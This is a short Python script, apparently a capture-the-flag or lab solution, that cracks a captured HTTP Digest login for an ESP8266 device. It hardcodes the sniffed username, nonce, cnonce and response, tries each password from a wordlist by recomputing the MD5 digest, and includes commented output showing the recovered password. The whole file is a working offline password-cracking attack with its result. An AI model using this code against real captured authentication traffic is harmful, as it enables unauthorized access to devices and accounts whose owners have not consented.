import hashlib
#GET /login HTTP/1.1
#Authorization: Digest 
username="john"
realm="ESP8266 IDO Auth Realm"
nonce="697e2220a3e76ed724cedc2c08769807"
uri="/login"
cnonce="YTRlYzhkZjg4MWViMTNhMTMyYmViZmY1MWFhMmNlZjY="
nc="00000001"
qop="auth"
response="c32fc78154711b36ef2239c815ad6c7a"
opaque="381c3490d37cf068825bbab96fe716d1"






with open('dico.txt', 'r') as mon_dico:
    for line in mon_dico:
        mdp = str(line)[:-1]
        hash1 = username+":"+realm+":"+mdp
        hash11 = hashlib.md5(hash1.encode())
        hash111 = hash11.hexdigest()
        #--------#
        hash2 = "GET:"+uri
        hash22 = hashlib.md5(hash2.encode())
        hash222 = hash22.hexdigest()
        #--------#
        hash3 = hash111+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+hash222
        hash33 = hashlib.md5(hash3.encode())
        hash333= hash33.hexdigest()
        #print(" result :"+hash333)
        #--------#
        if hash333==response:
            print("Right Login/Password : "+mdp)
            break
 #       else:
#            print("||||"+mdp+"|||||")

#---------STDOUT---------#
#[slaynpool@MiniZbeub]puce$ python digest_authAP2.py 
#Right Login/Password : 65983241
#---------STDOUT---------#




